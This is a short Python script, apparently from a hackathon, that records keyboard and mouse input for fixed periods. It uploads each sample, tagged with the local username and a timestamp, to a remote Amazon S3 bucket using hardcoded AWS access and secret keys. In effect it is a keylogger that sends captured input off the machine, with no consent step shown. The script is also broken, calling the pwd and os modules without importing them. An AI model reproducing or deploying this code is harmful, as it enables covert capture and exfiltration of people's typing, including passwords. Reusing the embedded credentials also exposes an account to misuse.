from mouse_collect import MouseCollector
from keyboard_collect import KeyboardCollector
import time, sched
from time import gmtime, strftime

import boto3

import uuid

AWS_ACCESS_KEY_ID = 'AKIAISPL262ZJ5VNEGXQ'
AWS_SECRET_ACCESS_KEY = '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'
BUCKET = 'rhino-hack3rs'

s3 = boto3.resource('s3',
                    aws_access_key_id=AWS_ACCESS_KEY_ID,
                    aws_secret_access_key=AWS_SECRET_ACCESS_KEY)

start_time = time.time()
f_str = strftime("%Y-%b-%d-%H:%M:%S", gmtime())


def get_username():
    return pwd.getpwuid( os.getuid() )[ 0 ]


def callback(p, input_type, data):
    key = f_str + '/' + get_username() + '-sample-' + input_type + "-" + str(p)
    s3.Bucket(BUCKET).put_object(Body=data, Key=key,
                  ContentType='text/json')


schedule = sched.scheduler(time.time, time.sleep)

bin_size = 2
total_bins = 2

k = KeyboardCollector(schedule, 1, 300, callback)
m = MouseCollector(schedule, 1, 300, callback)
schedule.run()



